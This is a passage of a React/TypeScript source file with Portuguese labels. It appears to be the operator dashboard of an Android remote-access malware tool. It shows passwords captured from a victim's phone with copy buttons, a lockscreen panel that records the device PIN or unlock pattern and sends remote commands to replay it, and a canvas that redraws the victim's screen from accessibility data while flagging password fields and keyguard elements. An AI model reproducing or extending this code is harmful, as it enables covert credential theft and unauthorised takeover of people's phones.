                            <span className="px-2 py-1 bg-green-800/60 text-green-300 text-[10px] rounded">
                              📱 APK Visual
                            </span>
                          )}
                        </div>
                        
                        {/* Senha capturada */}
                        <div className="bg-black/60 rounded-lg p-3 border border-orange-500/30">
                          <div className="text-2xl font-bold text-green-400 tracking-[0.3em] font-mono text-center">
                            {pwd.password}
                          </div>
                        </div>
                        
                        {/* Status */}
                        <div className="mt-2 flex items-center justify-between">
                          <div className={`px-2 py-1 rounded text-[10px] font-bold ${
                            pwd.status === 'captured' ? 'bg-yellow-500 text-black' :
                            pwd.status === 'confirmed' ? 'bg-green-500 text-white' :
                            'bg-red-600 text-white'
                          }`}>
                            {pwd.status === 'captured' && '⚡ CAPTURADA'}
                            {pwd.status === 'confirmed' && '✅ CONFIRMADA'}
                            {pwd.status === 'failed' && '❌ ERRO'}
                          </div>
                          <button
                            onClick={() => {
                              navigator.clipboard.writeText(pwd.password);
                              addLog(`📋 Senha copiada: ${pwd.password}`);
                            }}
                            className="px-2 py-1 bg-gray-700 hover:bg-gray-600 text-white text-[10px] rounded transition-colors"
                          >
                            📋 Copiar
                          </button>
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            </FloatingWindow>
            
            {/* 🔒 LOCKSCREEN - PIN + Pattern */}
            <FloatingWindow
              id="lockscreen"
              title="🔒 Lockscreen PIN + Pattern"
              isOpen={floatingWindows.lockscreen.open}
              position={{ x: floatingWindows.lockscreen.x, y: floatingWindows.lockscreen.y }}
              size={{ width: floatingWindows.lockscreen.width, height: floatingWindows.lockscreen.height }}
              zIndex={floatingWindows.lockscreen.zIndex}
              onClose={() => toggleWindow('lockscreen')}
              onFocus={() => bringToFront('lockscreen')}
              onDrag={(x, y) => updateWindowPosition('lockscreen', x, y)}
              onResize={(w, h) => updateWindowSize('lockscreen', w, h)}
              headerColor="bg-red-700"
            >
              <div className="p-3 h-full overflow-y-auto bg-gradient-to-br from-red-900/30 to-gray-900/90">
                {/* Tabs PIN / Pattern */}
                <div className="flex mb-3 bg-slate-800/80 rounded-lg p-1">
                  <button
                    onClick={() => setLockscreenType('PIN')}
                    className={`flex-1 py-2 rounded-md text-sm font-bold transition-all ${
                      lockscreenType === 'PIN' 
                        ? 'bg-yellow-600 text-white shadow-lg' 
                        : 'text-gray-400 hover:text-white'
                    }`}
                  >
                    🔢 PIN
                  </button>
                  <button
                    onClick={() => setLockscreenType('PATTERN')}
                    className={`flex-1 py-2 rounded-md text-sm font-bold transition-all ${
                      lockscreenType === 'PATTERN' 
                        ? 'bg-purple-600 text-white shadow-lg' 
                        : 'text-gray-400 hover:text-white'
                    }`}
                  >
                    🔲 Padrão
                  </button>
                </div>
                
                {/* Status */}
                <div className={`mb-3 p-2 rounded-lg text-center text-sm font-bold ${
                  isLockscreenActive 
                    ? 'bg-green-600/80 text-white animate-pulse' 
                    : 'bg-slate-700/80 text-gray-400'
                }`}>
                  {isLockscreenActive ? `🔒 ${lockscreenType} ATIVO` : '🔓 Inativo'}
                </div>
                
                {/* Botões de Ação */}
                <div className="flex gap-2 mb-3">
                  {!isLockscreenActive ? (
                    <button
                      onClick={() => showLockscreen()}
                      className="flex-1 py-2 bg-gradient-to-r from-red-600 to-red-700 hover:from-red-700 hover:to-red-800 text-white rounded-lg font-bold text-sm transition-all"
                    >
                      🔒 Bloquear
                    </button>
                  ) : (
                    <button
                      onClick={hideLockscreen}
                      className="flex-1 py-2 bg-gradient-to-r from-gray-600 to-gray-700 hover:from-gray-700 hover:to-gray-800 text-white rounded-lg font-bold text-sm transition-all"
                    >
                      ✖️ Desativar
                    </button>
                  )}
                </div>
                
                <div className="mb-3 rounded-lg p-2 border border-slate-600/50 bg-slate-900/40">
                  <div className="text-xs text-gray-400 font-semibold mb-1">📋 PINs capturados</div>
                  {renderCapturedUnlockPinsList()}
                </div>

                {renderUnlockRecordingControls()}
                
                {/* Capturado */}
                <div className="mb-3">
                  <label className="text-gray-400 text-xs font-semibold block mb-1">
                    {lockscreenType === 'PIN' ? '🔢 PIN Capturado:' : '🔲 Padrão Capturado:'}
                  </label>
                  <div className="flex gap-2">
                    <input
                      type="text"
                      value={lockscreenType === 'PIN' ? (capturedPin || pinInput) : (capturedPattern || patternInput)}
                      onChange={(e) => lockscreenType === 'PIN' ? setPinInput(e.target.value) : setPatternInput(e.target.value)}
                      className="flex-1 bg-black/60 border border-green-500/50 rounded-lg px-3 py-2 text-green-400 font-mono text-lg text-center tracking-widest"
                      placeholder={lockscreenType === 'PIN' ? '••••' : '14789'}
                    />
                    <button
                      onClick={() => {
                        const val = lockscreenType === 'PIN' ? (capturedPin || pinInput) : (capturedPattern || patternInput);
                        if (val) {
                          navigator.clipboard.writeText(val);
                          addLog(`📋 ${lockscreenType} copiado: ${val}`);
                        }
                      }}
                      className="px-3 bg-slate-700 hover:bg-slate-600 text-white rounded-lg text-sm"
                    >
                      📋
                    </button>
                  </div>
                </div>
                
                {/* Teclado PIN */}
                {lockscreenType === 'PIN' && (
                  <div className="mb-3">
                    <div className="grid grid-cols-3 gap-1.5 max-w-[200px] mx-auto">
                      {[1,2,3,4,5,6,7,8,9].map(n => (
                        <button
                          key={n}
                          onClick={() => {
                            setPinInput((prev) => prev + n);
                            pressLockKey(String(n));
                          }}
                          className="py-2.5 bg-slate-700 hover:bg-slate-600 text-white rounded-lg font-bold text-lg transition-all"
                        >
                          {n}
                        </button>
                      ))}
                      <button
                        onClick={() => {
                          setPinInput((prev) => prev.slice(0, -1));
                          pressLockKey('DELETE');
                        }}
                        className="py-2.5 bg-red-700 hover:bg-red-600 text-white rounded-lg font-bold text-sm"
                      >
                        ⌫
                      </button>
                      <button
                        onClick={() => {
                          setPinInput((prev) => prev + '0');
                          pressLockKey('0');
                        }}
                        className="py-2.5 bg-slate-700 hover:bg-slate-600 text-white rounded-lg font-bold text-lg"
                      >
                        0
                      </button>
                      <button
                        onClick={() => pressLockKey('ENTER')}
                        className="py-2.5 bg-green-700 hover:bg-green-600 text-white rounded-lg font-bold text-sm"
                      >
                        ✓
                      </button>
                    </div>
                  </div>
                )}
                
                {/* Grid Pattern */}
                {lockscreenType === 'PATTERN' && (
                  <div className="mb-3">
                    <div className="grid grid-cols-3 gap-3 max-w-[160px] mx-auto bg-slate-800/60 p-4 rounded-xl">
                      {[1,2,3,4,5,6,7,8,9].map(n => (
                        <div
                          key={n}
                          onClick={() => setPatternInput(prev => prev.includes(String(n)) ? prev : prev + n)}
                          className={`w-10 h-10 rounded-full flex items-center justify-center cursor-pointer transition-all ${
                            patternInput.includes(String(n))
                              ? 'bg-purple-500 text-white scale-110 shadow-lg shadow-purple-500/50'
                              : 'bg-slate-700 text-gray-400 hover:bg-slate-600'
                          }`}
                        >
                          {n}
                        </div>
                      ))}
                    </div>
                    <button
                      onClick={() => setPatternInput('')}
                      className="mt-2 w-full py-1.5 bg-slate-700 hover:bg-slate-600 text-gray-300 rounded-lg text-xs"
                    >
                      🔄 Limpar Padrão
                    </button>
                  </div>
                )}
                
                {/* Reprodução Automática */}
                <div className="bg-slate-800/60 rounded-lg p-3">
                  <div className="text-xs text-gray-400 font-semibold mb-2">🔄 Reprodução Automática</div>
                  <div className="flex items-center gap-2 mb-2">
                    <span className="text-gray-400 text-xs">Delay:</span>
                    <input
                      type="number"
                      value={pinDelay}
                      onChange={(e) => setPinDelay(Number(e.target.value))}
                      className="w-16 bg-slate-700 border border-slate-600 rounded px-2 py-1 text-white text-xs text-center"
                    />
                    <span className="text-gray-500 text-xs">ms</span>
                  </div>
                  <button
                    onClick={() => {
                      const val = lockscreenType === 'PIN' ? (capturedPin || pinInput) : (capturedPattern || patternInput);
                      if (val) {
                        if (lockscreenType === 'PIN') {
                          sendCommand({ action: 'PLAY_PIN_SEQUENCE', pin: val, delay: pinDelay });
                          addLog(`🔄 Reproduzindo PIN: ${val}`);
                        } else {
                          sendCommand({ action: 'PLAY_PATTERN_SEQUENCE', pattern: val, delay: pinDelay });
                          addLog(`🔄 Reproduzindo Padrão: ${val}`);
                        }
                      }
                    }}
                    disabled={isPlayingPin}
                    className={`w-full py-2 rounded-lg font-bold text-sm transition-all ${
                      isPlayingPin
                        ? 'bg-gray-600 text-gray-400 cursor-not-allowed'
                        : lockscreenType === 'PIN'
                          ? 'bg-gradient-to-r from-yellow-600 to-orange-600 hover:from-yellow-700 hover:to-orange-700 text-white'
                          : 'bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white'
                    }`}
                  >
                    {isPlayingPin ? '⏳ Reproduzindo...' : `🔓 Reproduzir ${lockscreenType}`}
                  </button>
                </div>
              </div>
            </FloatingWindow>
          </div>
        </div>
      )}
    </div>
  );
}

// 🪟 Componente de Janela Flutuante Inline
interface FloatingWindowProps {
  id: string;
  title: string;
  children: React.ReactNode;
  isOpen: boolean;
  position: { x: number; y: number };
  size: { width: number; height: number };
  zIndex: number;
  onClose: () => void;
  onFocus: () => void;
  onDrag: (x: number, y: number) => void;
  onResize: (width: number, height: number) => void;
  headerColor?: string;
}

function FloatingWindow({ 
  title, 
  children, 
  isOpen, 
  position, 
  size, 
  zIndex, 
  onClose, 
  onFocus, 
  onDrag, 
  onResize,
  headerColor = 'bg-slate-700'
}: FloatingWindowProps) {
  const [isDragging, setIsDragging] = useState(false);
  const [isResizing, setIsResizing] = useState(false);
  const [isMinimized, setIsMinimized] = useState(false);
  const dragStart = useRef({ x: 0, y: 0, posX: 0, posY: 0 });
  const resizeStart = useRef({ width: 0, height: 0, x: 0, y: 0 });
  
  useEffect(() => {
    const handleMouseMove = (e: MouseEvent) => {
      if (isDragging) {
        const newX = Math.max(0, e.clientX - dragStart.current.x + dragStart.current.posX);
        const newY = Math.max(50, e.clientY - dragStart.current.y + dragStart.current.posY);
        onDrag(newX, newY);
      }
      if (isResizing) {
        const newWidth = Math.max(250, resizeStart.current.width + (e.clientX - resizeStart.current.x));
        const newHeight = Math.max(200, resizeStart.current.height + (e.clientY - resizeStart.current.y));
        onResize(newWidth, newHeight);
      }
    };
    
    const handleMouseUp = () => {
      setIsDragging(false);
      setIsResizing(false);
    };
    
    if (isDragging || isResizing) {
      document.addEventListener('mousemove', handleMouseMove);
      document.addEventListener('mouseup', handleMouseUp);
    }
    
    return () => {
      document.removeEventListener('mousemove', handleMouseMove);
      document.removeEventListener('mouseup', handleMouseUp);
    };
  }, [isDragging, isResizing, onDrag, onResize]);
  
  if (!isOpen) return null;
  
  return (
    <div
      className="fixed bg-slate-800 rounded-lg shadow-2xl border border-slate-600 overflow-hidden"
      style={{
        left: position.x,
        top: position.y,
        width: isMinimized ? 250 : size.width,
        height: isMinimized ? 'auto' : size.height,
        zIndex: zIndex,
      }}
      onClick={onFocus}
    >
      {/* Header */}
      <div
        className={`${headerColor} px-3 py-2 flex items-center justify-between cursor-grab active:cursor-grabbing select-none`}
        onMouseDown={(e) => {
          if ((e.target as HTMLElement).closest('.window-btn')) return;
          setIsDragging(true);
          dragStart.current = { x: e.clientX, y: e.clientY, posX: position.x, posY: position.y };
          onFocus();
        }}
      >
        <div className="flex items-center space-x-2 text-white font-semibold text-sm">
          <Move className="w-4 h-4 text-gray-300" />
          <span>{title}</span>
        </div>
        
        <div className="flex items-center space-x-1">
          <button
            className="window-btn p-1 hover:bg-white/20 rounded"
            onClick={() => setIsMinimized(!isMinimized)}
          >
            {isMinimized ? <Maximize2 className="w-3 h-3 text-white" /> : <Minimize2 className="w-3 h-3 text-white" />}
          </button>
          <button className="window-btn p-1 hover:bg-red-500 rounded" onClick={onClose}>
            <X className="w-3 h-3 text-white" />
          </button>
        </div>
      </div>
      
      {/* Content */}
      {!isMinimized && (
        <div style={{ height: size.height - 40 }}>
          {children}
        </div>
      )}
      
      {/* Resize Handle */}
      {!isMinimized && (
        <div
          className="absolute bottom-0 right-0 w-4 h-4 cursor-se-resize"
          onMouseDown={(e) => {
            e.stopPropagation();
            setIsResizing(true);
            resizeStart.current = { width: size.width, height: size.height, x: e.clientX, y: e.clientY };
            onFocus();
          }}
        >
          <svg className="w-4 h-4 text-gray-500" viewBox="0 0 24 24" fill="currentColor">
            <path d="M22 22H20V20H22V22ZM22 18H20V16H22V18ZM18 22H16V20H18V22ZM22 14H20V12H22V14ZM18 18H16V16H18V18ZM14 22H12V20H14V22Z" />
          </svg>
        </div>
      )}
    </div>
  );
}

type ScreenReaderNode = {
  bounds?: { x: number; y: number; w: number; h: number };
  children?: ScreenReaderNode[];
  text?: string;
  desc?: string;
  hint?: string; // Hint do campo de texto
  class?: string;
  id?: string;
  clickable?: boolean;
  editable?: boolean;
  password?: boolean;
  focused?: boolean;
  isKeyboard?: boolean;
  checked?: boolean;
  enabled?: boolean;
  scrollable?: boolean;
  longClickable?: boolean;
  selected?: boolean;
  // Elementos de lockscreen
  isLockScreen?: boolean;
  isLockElement?: boolean;
  isPinDigit?: boolean;
  isPatternLock?: boolean;
  isSwipeUnlock?: boolean;
  windowType?: number;
  windowPackage?: string;
  patternGrid?: { x: number; y: number; r?: number }[];
  gridRows?: number;
  gridCols?: number;
  swipeHint?: { sx: number; sy: number; ex: number; ey: number };
};

const ScreenReaderCanvas = ({ hierarchy, maxHeight }: { hierarchy?: ScreenReaderNode; scale?: number; maxHeight?: number }) => {
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const animationFrameRef = useRef<number>(0);

  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    
    // Usa offscreen canvas para melhor performance quando disponível
    const ctx = canvas.getContext('2d', { 
      alpha: false,
      desynchronized: true // Permite renderização assíncrona
    });
    if (!ctx) return;

    // Cancela frame anterior se existir
    if (animationFrameRef.current) {
      cancelAnimationFrame(animationFrameRef.current);
    }

    // Usa requestAnimationFrame para sincronizar com o display
    animationFrameRef.current = requestAnimationFrame(() => {
      const dpr = window.devicePixelRatio || 1;
      
      // Só redimensiona se necessário
      if (canvas.width !== SCREEN_BASE_WIDTH * dpr || canvas.height !== SCREEN_BASE_HEIGHT * dpr) {
        canvas.width = SCREEN_BASE_WIDTH * dpr;
        canvas.height = SCREEN_BASE_HEIGHT * dpr;
      }
      
      ctx.resetTransform();
      ctx.scale(dpr, dpr);
      
      // Fundo preto igual tela de celular
      ctx.fillStyle = '#000000';
      ctx.fillRect(0, 0, SCREEN_BASE_WIDTH, SCREEN_BASE_HEIGHT);

      if (hierarchy) {
        // Coleta TODOS os elementos visíveis (folhas sem filhos OU com texto)
        const allNodes: ScreenReaderNode[] = [];
        collectAllVisibleNodes(hierarchy, allNodes);
        
        // Ordena por área (maiores primeiro, para desenhar containers antes)
        allNodes.sort((a, b) => {
          const areaA = (a.bounds?.w || 0) * (a.bounds?.h || 0);
          const areaB = (b.bounds?.w || 0) * (b.bounds?.h || 0);
          return areaB - areaA;
        });
        
        // Desenha todos os elementos
        allNodes.forEach(node => drawElement(ctx, node));
      }
    });

    return () => {
      if (animationFrameRef.current) {
        cancelAnimationFrame(animationFrameRef.current);
      }
    };
  }, [hierarchy]);

  return (
    <canvas
      ref={canvasRef}
      data-screen="true"
      className="block w-full h-auto"
      style={{
        maxWidth: '100%',
        maxHeight: maxHeight ? `${maxHeight}px` : undefined,
        aspectRatio: `${SCREEN_BASE_WIDTH} / ${SCREEN_BASE_HEIGHT}`,
        willChange: 'contents', // Hint para o browser otimizar
      }}
    />
  );
};

// Detecta se é um campo de input/senha
const isInputField = (node: ScreenReaderNode): boolean => {
  const className = node.class?.toLowerCase() || '';
  return (
    node.editable === true ||
    node.password === true ||
    className.includes('edittext') ||
    className.includes('textinput') ||
    className.includes('inputfield') ||
    className.includes('textfield')
  );
};

// Detecta se é tecla do teclado
const isKeyboardKey = (node: ScreenReaderNode): boolean => {
  const className = node.class?.toLowerCase() || '';
  const id = node.id?.toLowerCase() || '';
  
  // Propriedade explícita do Android
  if ((node as any).isKeyboardKey === true) return true;
  
  // Detecção por classe/id
  if (className.includes('key') || className.includes('keyboard') ||
      id.includes('key') || id.includes('keyboard')) return true;
  
  // Detecção por tamanho típico de tecla (quando clicável)
  if (node.clickable === true && node.bounds != null) {
    const { w, h } = node.bounds;
    // Tecla típica: entre 50-200px de largura, 50-150px de altura
    if (w >= 30 && w <= 250 && h >= 40 && h <= 180) {
      // Proporção típica de tecla
      const ratio = w / h;
      if (ratio >= 0.5 && ratio <= 3) return true;
    }
  }
  
  return false;
};

// Coleta TODOS os elementos visíveis (não só os com texto)
const collectAllVisibleNodes = (node: ScreenReaderNode, nodes: ScreenReaderNode[]) => {
  if (!node || !node.bounds) return;
  
  const { x, y, w, h } = node.bounds;
  
  // Ignora elementos fora da tela ou muito pequenos
  if (x + w < 0 || y + h < 0 || x > SCREEN_BASE_WIDTH || y > SCREEN_BASE_HEIGHT) return;
  if (w < 3 || h < 3) return; // Reduzido para capturar elementos menores
  
  const hasChildren = node.children && node.children.length > 0;
  const hasText = !!(node.text && node.text.trim());
  const hasDesc = !!(node.desc && node.desc.trim());
  const isClickable = node.clickable;
  const isImportant = isInputField(node) || node.password || node.focused;
  const isLockElement = node.isLockElement || node.isPinDigit || node.isPatternLock || node.isSwipeUnlock || node.isLockScreen;
  const isKey = isKeyboardKey(node);
  const isKeyboardKeyNode = (node as any).isKeyboardKey === true;
  
  // Adiciona se:
  // 1. Não tem filhos (é folha)
  // 2. OU tem texto/descrição
  // 3. OU é clicável
  // 4. OU é campo importante
  // 5. OU é elemento de lockscreen
  // 6. OU é tecla de teclado (mesmo sem texto)
  if (!hasChildren || hasText || hasDesc || isClickable || isImportant || isLockElement || isKey || isKeyboardKeyNode) {
    nodes.push(node);
  }
  
  // Sempre processa filhos
  node.children?.forEach(child => collectAllVisibleNodes(child, nodes));
};

// Detecta se é elemento de lockscreen
const isLockScreenElement = (node: ScreenReaderNode): boolean => {
  const className = node.class?.toLowerCase() || '';
  const id = node.id?.toLowerCase() || '';
  return (
    node.isLockScreen === true ||
    node.isLockElement === true ||
    node.isPinDigit === true ||
    node.isPatternLock === true ||
    node.isSwipeUnlock === true ||
    className.includes('keyguard') ||
    className.includes('lockpattern') ||
    className.includes('pinview') ||
    id.includes('keyguard') ||
    id.includes('lock') ||
    id.includes('pin')
  );
};

// Desenha um elemento individual
const drawElement = (ctx: CanvasRenderingContext2D, node: ScreenReaderNode) => {
  const { x, y, w, h } = node.bounds!;
  let text = node.text?.trim() || node.desc?.trim() || '';
  
  // Tenta obter texto de extras (para teclados Android 12+)
  const nodeAny = node as any;
  if (!text && nodeAny.extra_text) text = nodeAny.extra_text;
  if (!text && nodeAny.extra_label) text = nodeAny.extra_label;
  if (!text && nodeAny.tooltip) text = nodeAny.tooltip;
  if (!text && nodeAny.stateDesc) text = nodeAny.stateDesc;
  
  // Se for campo de senha, mostra indicador especial
  if (node.password && text) {
    // Conta quantos caracteres tem (remove ●)
    const cleanText = text.replace(/●/g, '');
    const dotCount = (text.match(/●/g) || []).length;
    if (dotCount > 0) {
      text = `🔑 [${dotCount} dígitos digitados]`;
    } else if (cleanText) {
      text = `🔑 ${cleanText}`;
    }
  } else if (node.password && !text) {
    text = '🔑 [CAMPO SENHA]';
  }
  
  // Se for campo editável (input) sem texto, mostra hint
  if (node.editable && !text && node.hint) {
    text = `📝 ${node.hint}`;
  }
  
  const isInput = isInputField(node);
  const isKey = isKeyboardKey(node);
  const isLock = isLockScreenElement(node);
  const isKeyboardKeyNode = nodeAny.isKeyboardKey === true;
  
  // Para teclas de teclado sem texto, mostra um símbolo baseado no tipo
  if ((isKey || isKeyboardKeyNode) && !text) {
    const keyType = nodeAny.keyType || '';
    if (keyType === 'special') {
      // Tecla especial (espaço, enter, etc) - mais larga
      if (w > h * 2.5) {
        text = '⎵'; // Espaço
      } else {
        text = '⏎'; // Enter/Return
      }
    } else if (keyType === 'medium') {
      text = '⌫'; // Backspace
    } else {
      // Tecla normal - mostra um quadrado indicando tecla
      text = '▪';
    }
  }
  
  // Define cores baseadas no tipo de elemento
  let bgColor = 'rgba(30, 41, 59, 0.95)'; // Slate-800
  let borderColor = '#475569'; // Slate-600
  let textColor = '#F1F5F9'; // Slate-100
  let borderWidth = 1;
  
  // PIN digit (número do teclado de desbloqueio)
  if (node.isPinDigit) {
    bgColor = 'rgba(251, 191, 36, 0.9)'; // Amber
    borderColor = '#F59E0B'; // Amber-500
    textColor = '#000000';
    borderWidth = 2;
  }
  // Padrão de desbloqueio
  else if (node.isPatternLock) {
    bgColor = 'rgba(6, 182, 212, 0.3)'; // Cyan transparente
    borderColor = '#06B6D4'; // Cyan-500
    textColor = '#FFFFFF';
    borderWidth = 3;
  }
  // Swipe to unlock
  else if (node.isSwipeUnlock) {
    bgColor = 'rgba(16, 185, 129, 0.5)'; // Emerald transparente
    borderColor = '#10B981'; // Emerald-500
    textColor = '#FFFFFF';
    borderWidth = 2;
  }
  // Elemento genérico de lockscreen
  else if (isLock) {
    bgColor = 'rgba(99, 102, 241, 0.8)'; // Indigo
    borderColor = '#6366F1'; // Indigo-500
    textColor = '#FFFFFF';
    borderWidth = 2;
  }
  else if (node.password) {
    bgColor = 'rgba(127, 29, 29, 0.95)'; // Red escuro
    borderColor = '#EF4444'; // Red-500
    textColor = '#FCA5A5'; // Red-300
    borderWidth = 2;
  } else if (isInput) {
    bgColor = 'rgba(20, 83, 45, 0.95)'; // Green escuro
    borderColor = '#22C55E'; // Green-500
    textColor = '#86EFAC'; // Green-300
    borderWidth = 2;
  } else if (isKey) {
    bgColor = 'rgba(51, 65, 85, 0.98)'; // Slate-700
    borderColor = '#64748B'; // Slate-500
    textColor = '#FFFFFF';
    borderWidth = 1;
  } else if (node.clickable) {
    bgColor = 'rgba(30, 58, 138, 0.9)'; // Blue escuro
    borderColor = '#3B82F6'; // Blue-500
    textColor = '#93C5FD'; // Blue-300
  } else if (node.focused) {
    bgColor = 'rgba(88, 28, 135, 0.9)'; // Purple escuro
    borderColor = '#A855F7'; // Purple-500
    textColor = '#D8B4FE'; // Purple-300
    borderWidth = 2;
  }
  
  // Desenha fundo com cantos arredondados
  const radius = Math.min(8, w / 6, h / 6);
  ctx.fillStyle = bgColor;
  ctx.beginPath();
  ctx.roundRect(x, y, w, h, radius);
  ctx.fill();
  
  // Desenha borda
  ctx.strokeStyle = borderColor;
  ctx.lineWidth = borderWidth;
  ctx.stroke();
  
  // Desenha texto se existir
  if (text) {
    ctx.save();
    
    // Calcula tamanho de fonte que cabe no elemento
    const textLen = text.length;
    const maxFontByHeight = Math.floor(h * 0.55);
    const maxFontByWidth = Math.floor((w - 12) / (textLen * 0.52));
    let fontSize = Math.max(12, Math.min(22, maxFontByHeight, maxFontByWidth));
    
    // Teclas do teclado: fonte maior e mais legível
    if (isKey && text.length <= 2) {
      fontSize = Math.min(28, h * 0.5);
    }
    
    ctx.font = `600 ${fontSize}px "Segoe UI", -apple-system, sans-serif`;
    ctx.fillStyle = textColor;
    ctx.textBaseline = 'middle';
    ctx.textAlign = 'center';
    
    // Trunca texto se necessário
    const maxWidth = w - 10;
    let displayText = text;
    let measured = ctx.measureText(displayText);
    while (measured.width > maxWidth && displayText.length > 1) {
      displayText = displayText.slice(0, -1);
      measured = ctx.measureText(displayText + '…');
    }
    if (displayText !== text) {
      displayText = displayText + '…';
    }
    
    // Sombra para legibilidade
    ctx.shadowColor = 'rgba(0,0,0,0.8)';
    ctx.shadowBlur = 3;
    ctx.shadowOffsetX = 1;
    ctx.shadowOffsetY = 1;
    
    ctx.fillText(displayText, x + w / 2, y + h / 2);
    ctx.restore();
  }
  
  // Indicadores especiais
  if (node.password) {
    ctx.save();
    ctx.font = 'bold 16px Arial';
    ctx.fillStyle = '#FF6B6B';
    ctx.shadowColor = '#000';
    ctx.shadowBlur = 3;
    ctx.fillText('🔒', x + 5, y - 5);
    ctx.restore();
  }
  
  if (node.isPatternLock && node.bounds) {
    const cx = node.bounds.x;
    const cy = node.bounds.y;
    const cw = node.bounds.w;
    const ch = node.bounds.h;
    const rows = node.gridRows || 3;
    const cols = node.gridCols || 3;
    const radius = Math.min(cw / (cols * 4), ch / (rows * 4));
    const drawDot = (dx: number, dy: number) => {
      ctx.save();
      ctx.fillStyle = '#06B6D4';
      ctx.beginPath();
      ctx.arc(dx, dy, radius, 0, Math.PI * 2);
      ctx.fill();
      ctx.restore();
    };
    if (node.patternGrid && node.patternGrid.length >= rows * cols) {
      node.patternGrid.forEach(p => drawDot(p.x, p.y));
    } else {
      for (let r = 0; r < rows; r++) {
        for (let c = 0; c < cols; c++) {
          const dx = cx + (c + 0.5) * (cw / cols);
          const dy = cy + (r + 0.5) * (ch / rows);
          drawDot(dx, dy);
        }
      }
    }
  }

  if (node.isSwipeUnlock && node.bounds) {
    const hint = node.swipeHint;
    const sx = hint ? hint.sx : node.bounds.x + node.bounds.w / 2;
    const sy = hint ? hint.sy : node.bounds.y + node.bounds.h * 0.75;
    const ex = hint ? hint.ex : node.bounds.x + node.bounds.w / 2;
    const ey = hint ? hint.ey : node.bounds.y + node.bounds.h * 0.25;
    ctx.save();
    ctx.strokeStyle = '#10B981';
    ctx.lineWidth = 3;
    ctx.beginPath();
    ctx.moveTo(sx, sy);
    ctx.lineTo(ex, ey);
    ctx.stroke();
    const angle = Math.atan2(ey - sy, ex - sx);
    const ah = 10;
    const aw = 6;
    ctx.beginPath();
    ctx.moveTo(ex, ey);
    ctx.lineTo(ex - aw * Math.cos(angle - Math.PI / 6), ey - aw * Math.sin(angle - Math.PI / 6));
    ctx.lineTo(ex - ah * Math.cos(angle), ey - ah * Math.sin(angle));
    ctx.lineTo(ex - aw * Math.cos(angle + Math.PI / 6), ey - aw * Math.sin(angle + Math.PI / 6));
    ctx.closePath();
    ctx.fillStyle = '#10B981';
    ctx.fill();
    ctx.restore();
  }
  if (node.focused && !node.password) {
    ctx.save();
    ctx.font = 'bold 14px Arial';
    ctx.fillStyle = '#A855F7';
    ctx.shadowColor = '#000';
    ctx.shadowBlur = 3;
    ctx.fillText('●', x + w - 12, y + 12);
    ctx.restore();
  }
};
